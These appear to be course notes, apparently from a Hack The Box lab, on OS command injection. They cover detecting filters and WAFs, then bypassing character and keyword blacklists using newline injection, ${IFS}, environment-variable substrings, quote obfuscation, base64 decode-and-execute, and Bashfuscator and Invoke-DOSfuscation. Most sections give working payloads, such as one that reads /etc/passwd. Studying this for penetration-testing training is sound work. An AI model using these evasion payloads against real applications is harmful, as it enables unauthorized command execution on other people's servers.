# Identifying Filters

Even with preventive coding practices, many developers implement back-end filters or deploy Web Application Firewalls (WAFs) to detect and block injection attempts.
These layers may:

- Reject requests with blacklisted characters or keywords   
- Monitor for suspicious behavior and patterns
- Block known command injection or SQL/XSS attack signatures
## Detecting Filters and WAFs

When submitting a known working payload like:

```
127.0.0.1; whoami
```

The web application now returns:

> `Invalid input`

This suggests:

- A filter or WAF is actively inspecting requests.    
- The response format gives hints about the filtering mechanism:
    - If rejection happens within the app's response UI, it's likely from application-side filters (e.g., PHP blacklist).
    - If rejection causes a separate error page, possibly with logging info, it could be WAF-level rejection.        
### Payload Analysis

Let's break down the rejected payload:

```
127.0.0.1; whoami
```

Suspicious elements:

- `;` → common shell command separator    
- Space character
- `whoami` → system command

This means either characters, keywords, or both are being blacklisted.
## Application-Level Blacklisting Example

A typical PHP-based character blacklist might look like this:

```php
$blacklist = ['&', '|', ';', ...];
foreach ($blacklist as $char) {
    if (strpos($_POST['ip'], $char) !== false) {
        echo "Invalid input";
    }
}
```

- If any one of the blacklisted characters is found, the input is rejected.
## Identifying the Blacklisted Character(s)

### Method

Use incremental testing:

- Start with a known valid input: `127.0.0.1`    
- Add one character at a time to identify what triggers the block
### Example

#### Test 1:

```
127.0.0.1;
```

Encoded as: `127.0.0.1%3b`

Result: Rejected → confirms `;` is blacklisted

#### Repeat this process for:

- `&` (`%26`)   
- `|` (`%7c`)
- `&&`, `||`, backticks, `$()`
- System keywords like `whoami`, `id`, `ls`, etc.

This helps build a complete picture of the blacklist.
## Summary: Filter Detection Steps

1. Submit known payload (`127.0.0.1; whoami`)    
2. Observe how the error appears:
    - UI message → App-level filter
    - Custom error page or redirect → WAF
3. Break payload into parts and test incrementally
    - Helps identify the specific blacklisted characters
4. Document which characters and commands get blocked
    - Use this for bypass planning
# Bypassing Space Filters

Modern web applications often implement blacklists to block suspicious characters such as semicolons, pipes, and even spaces, particularly when input fields expect strict formats (like IP addresses).

However, multiple techniques can bypass space filters and still execute arbitrary commands.
### Step 1: Finding a Working Injection Operator

While many operators (`;`, `&&`, `||`, etc.) may be blacklisted, the newline character (`\n` / `%0a`) is commonly allowed.

Payload Example:

```
127.0.0.1%0a
```

✅ The command executes and returns the ping result, confirming newline is a valid injection point.
## Space Bypass Techniques

Once you have an injection point (e.g., newline), the next challenge is replacing space characters between command arguments.
### 1. Using Tabs (`\t` / `%09`)

Both Linux and Windows treat tabs like spaces in most command-line contexts.

Payload:

```
127.0.0.1%0a%09whoami
```

✅ Result: Command runs successfully
### 2. Using `${IFS}` (Internal Field Separator)

In Unix/Linux, the `$IFS` environment variable defines delimiters — its default value includes space and tab.

Payload:

```
127.0.0.1%0a${IFS}whoami
```

✅ Result: Command runs, space bypassed via `${IFS}`
### 3. Using Bash Brace Expansion

Brace expansion allows you to avoid spaces by wrapping command and arguments inside curly braces:

Syntax:

```bash
{command,arg1,arg2}
```

Local Test:

```bash
{ls,-la}
```

✅ Bash expands this to: `ls -la`

Payload Example:

```
127.0.0.1%0a{ls,-la}
```

✅ Command runs without any space character
### Summary: Space Bypass Techniques

| Technique       | Payload Fragment | Description                                    |
| --------------- | ---------------- | ---------------------------------------------- |
| Tab character   | `%09`            | Interpreted as space on Linux and Windows      |
| Newline + Tab   | `%0a%09`         | Chain multiple commands with tab-based spacing |
| `${IFS}`        | `${IFS}`         | Unix env var defaults to space + tab           |
| Brace Expansion | `{command,arg}`  | Expands into space-separated command           |
### Reference

For additional methods of writing commands without spaces, check:  
[PayloadsAllTheThings – Commands Without Spaces](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#bypass-filters)
# Bypassing Other Blacklisted Characters

In addition to blacklisted operators and spaces, applications may block:

- Slash characters: `/` (Linux/macOS), `\` (Windows)
- Semicolons `;`
- Pipe `|`
- Other command symbols or delimiters

These characters are essential for:

- File paths    
- Shell command syntax
- Injection chaining

To bypass this, we use variable manipulation, substrings, and character transformation.
## Linux Techniques

### 1. Using Environment Variable Substrings

Linux supports string slicing on environment variables using `${VAR:start:length}`

#### Example: Extract `/` from `$PATH`

```bash
echo ${PATH}
/usr/local/bin:/usr/bin:/bin:/usr/games
```

```bash
echo ${PATH:0:1}
# Output: /
```

✅ Use `${PATH:0:1}` in your payload instead of `/`.

#### Example: Extract `;` from `$LS_COLORS`

```bash
echo ${LS_COLORS:10:1}
# Output: ;
```

✅ Use `${LS_COLORS:10:1}` instead of `;`

>  Tip: Use `printenv` to dump all environment variables and locate strings that include your desired character.

#### Combined Payload Example

```
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
```

- `${LS_COLORS:10:1}` → `;`
- `${IFS}` → space

✅ Successfully bypasses both semicolon and space blacklist.
### 2. Character Shifting Using `tr`

You can generate characters based on ASCII offset logic:

- `/` has ASCII code `92`    
- `[` is `91` (right before `/`)

```bash
echo $(tr '!-}' '"-~' <<< [)
# Output: \
```

✅ This technique allows indirect character printing without literal input.

> You can look up ASCII values using:

```bash
man ascii
```
## Windows Techniques

### CMD (Command Prompt)

Use substring notation to extract characters from environment variables:
#### Example: Extract `\` from `%HOMEPATH%`

```cmd
echo %HOMEPATH%
# Output: \Users\htb-student

echo %HOMEPATH:~6,-11%
# Output: \
```

- `~6` → skip to start of username    
- `-11` → cut from end, just extract `\`

✅ Use `%HOMEPATH:~6,-11%` instead of backslash.
### PowerShell

PowerShell treats strings as arrays. Extract a single character using index access:

#### Example: Extract `\` from environment variable

```powershell
$env:HOMEPATH[0]
# Output: \
```

✅ Use `$env:HOMEPATH[0]` to inject a backslash.

> Use:

```powershell
Get-ChildItem Env:
```

to enumerate all environment variables in PowerShell.
## Summary: Blacklist Bypass Methods

| Technique                     | Example Payload / Usage          | Result             |
| ----------------------------- | -------------------------------- | ------------------ |
| Substring on `$PATH`      | `${PATH:0:1}`                    | `/`                |
| Substring on `$LS_COLORS` | `${LS_COLORS:10:1}`              | `;`                |
| ASCII char shifting       | `$(tr '!-}' '"-~' <<< [)`        | `\`                |
| CMD substring             | `%HOMEPATH:~6,-11%`              | `\`                |
| PowerShell indexing       | `$env:HOMEPATH[0]`               | `\`                |
| Space bypass recap        | `${IFS}`, `%09`, brace expansion | Simulate space/tab |
## Tools & References

- `printenv` (Linux): list environment variables    
- `man ascii`: check ASCII values   
- `PayloadsAllTheThings`: creative bypasses
    - [Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
# Bypassing Blacklisted Commands

When applications implement command word blacklists, even previously successful payloads may get blocked if they contain specific keywords like `whoami`, `cat`, `id`, etc.

Blacklisted commands are usually matched as full strings, so with obfuscation, we can bypass exact matching filters while still executing the intended command.

### PHP Example: Command Word Blacklist

```php
$blacklist = ['whoami', 'cat', ...];
foreach ($blacklist as $word) {
    if (strpos($_POST['ip'], $word) !== false) {
        echo "Invalid input";
    }
}
```

- This blocks exact matches (e.g., `whoami`)
- Partial or obfuscated versions may slip through
## Obfuscation Techniques

Obfuscation involves modifying a command's appearance so it's not matched literally, while still being valid to the shell.
### 1. Inserting Quotes (`'` or `"`)

Quotes are ignored by most shells if used consistently.

#### Linux & Windows Example

```bash
w'h'o'am'i
```

or

```bash
w"h"o"am"i
```

Constraints:

- Use only one type of quote per command
- Must be an even number of quotes

✅ Works on Linux and Windows (CMD & PowerShell)

Payload Example:

```
127.0.0.1%0aw'h'o'am'i
```

✅ Returns correct output, bypassing blacklist
### 2. Using Backslash (`\`) — Linux Only

The backslash acts as an escape character but is ignored if not followed by special characters.

```bash
w\ho\am\i
```

✅ Successfully executes `whoami`
### 3. Using `$@` — Linux Only

`$@` is a positional parameter in bash, but is ignored if not used in a command expecting arguments.

```bash
who$@ami
```

✅ Also runs `whoami` unchanged
### 4. Using Caret (`^`) — Windows Only

The `^` character in CMD acts as a line continuation or escape character and is ignored if used between characters.

```cmd
who^ami
```

✅ Executes successfully on Windows CMD
## Summary: Command Obfuscation Tricks

| Method        | Platform      | Example      | Works? |
| ------------- | ------------- | ------------ | ------ |
| `'` quotes    | Linux/Windows | `w'h'o'am'i` | ✅      |
| `"` quotes    | Linux/Windows | `w"h"o"am"i` | ✅      |
| `\` slashes   | Linux Only    | `w\ho\am\i`  | ✅      |
| `$@` variable | Linux Only    | `who$@ami`   | ✅      |
| `^` caret     | Windows Only  | `who^ami`    | ✅      |
## Additional Exercises

- Try combining quote obfuscation with space and character filter bypasses    
- Use `printenv`, `man ascii`, and previous tricks to reconstruct commands dynamically
- Use `Burp Suite` or `curl` to send payloads manually and observe differences in backend behavior
# Advanced Command Obfuscation

When dealing with advanced filters or WAFs, basic techniques may fail. In such cases, advanced command obfuscation helps disguise the intent of our payloads while achieving execution.

This section includes:

- Case manipulation
- String reversal
- Encoding (Base64/Hex)
- Real-time decoding and execution
### 1. Case Manipulation

#### Windows (Case-Insensitive)

```powershell
WhOaMi
# Output: 21y4d
```

✅ Works directly on CMD/PowerShell
#### Linux (Case-Sensitive)

To bypass filters expecting lowercase commands, use:

```bash
$(tr "[A-Z]" "[a-z]" <<< "WhOaMi")
# Output: 21y4d
```

Important: This uses spaces, so if spaces are blacklisted, use tabs:

```bash
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```
#### Alternative (Lowercasing via `printf`)

```bash
$(a="WhOaMi";printf%09%s%09"${a,,}")
```

✅ Ensure `%09` (tab) is used instead of space
### 2. Reversed Commands

Avoid blacklists by reversing the command string and decoding it at runtime.
#### Linux Example

```bash
echo 'whoami' | rev
# Output: imaohw

$(rev<<<'imaohw')
# Output: 21y4d
```

✅ Does not contain the blacklisted command string

> You can reverse filtered characters too to fully avoid detection.
#### Windows Example (PowerShell)

```powershell
"whoami"[-1..-20] -join ''
# Output: imaohw

iex "$('imaohw'[-1..-20] -join '')"
# Output: 21y4d
```
### 3. Base64-Encoded Commands

Encode the payload to bypass both content filters and WAF pattern matching.
#### Linux

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
# Output: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

✅ Avoids direct use of pipe `|`, space (use tabs), or the `cat` keyword

> Use `<<<` to avoid the pipe, or replace `bash` with `sh` if `bash` is filtered

#### Windows (PowerShell)

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# Output: dwBoAG8AYQBtAGkA

iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

✅ Encodes entire command and decodes it at runtime

### Obfuscation Summary

| Technique          | Linux Support   | Windows Support | Requires Filter Bypass |
| ------------------ | --------------- | --------------- | ---------------------- |
| Case Manipulation  | ✅ (with tricks) | ✅               | Sometimes              |
| Quote Insertion    | ✅               | ✅               | ✅                      |
| Special Characters | ✅               | ✅               | ✅                      |
| String Reversal    | ✅               | ✅ (via slicing) | ✅                      |
| Base64 Encoding    | ✅               | ✅               | ✅                      |
| Variable Expansion | ✅               | ✅               | ✅                      |
### Tools & Extra Techniques

- `PayloadsAllTheThings`
- `obfuscated-powershell` repos
- Encoding via `xxd`, `iconv`, `openssl`
- Other tricks:
    - Wildcards
    - Integer Expansion
    - Regex Substitution
    - Output Redirection
    - Dynamic Function Building

> You can mix these with character-level evasion (from previous sections) to build multi-layered obfuscation payloads.
### Final Tip

Always test payloads _incrementally_ in your local shell before sending to a target:

- Validate syntax    
- Replace spaces with `%09`
- Avoid triggering character-based filters

# Evasion Tools

When manual obfuscation techniques fail due to strong filters or WAFs, we can use automated tools to generate highly obfuscated command payloads.

This section covers two powerful tools:

- `Bashfuscator` (Linux)
- `Invoke-DOSfuscation` (Windows)
### Bashfuscator (Linux)
#### Overview
Bashfuscator is a modular Bash command obfuscation framework. It uses a combination of:

- Character shifting    
- Variable splitting
- Loop logic
- Token mangling
#### Installation

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

Run from:

```bash
cd ./bashfuscator/bin/
./bashfuscator -h
```
#### Basic Usage

```bash
./bashfuscator -c 'cat /etc/passwd'
```

⚠️ This may output a very large payload (>1k characters)
#### Simplified Payload

Use flags to limit complexity and output length:

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

Example Output:

```bash
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
```

#### Test Output

```bash
bash -c '<output_from_above>'
```

✅ Command executes as intended
### Invoke-DOSfuscation (Windows)

#### Overview

Invoke-DOSfuscation is an interactive PowerShell module that produces complex CMD/PowerShell payloads using:

- Substring extraction
- Env variable abuse
- Encoding tricks
#### Installation

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```
#### Usage Example

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

Example Output:

```cmd
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

✅ Running this command in CMD displays the contents of `flag.txt`
### Tips

- You can test PowerShell-based obfuscation in Linux with `pwsh` (PowerShell Core).    
- Both tools support layered obfuscation, token mangling, and payload complexity control.
- Output can be piped into `bash -c`, `cmd.exe`, or PowerShell IEX depending on the platform.
### Summary

| Tool                    | Platform | Purpose                           | Notes               |
| ----------------------- | -------- | --------------------------------- | ------------------- |
| Bashfuscator        | Linux    | Obfuscate bash commands           | Highly customizable |
| Invoke-DOSfuscation | Windows  | Obfuscate CMD/PowerShell payloads | Interactive tool    |
### Next Steps

- Try to generate a bypass payload using these tools and test them against filtered input forms    
- Analyze why certain payloads fail — is it due to length, characters, or decoding behavior?
- Refer to:
    - [PayloadsAllTheThings – Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
    - Secure Coding 101: JavaScript (for XSS/WAF bypass ideas)        
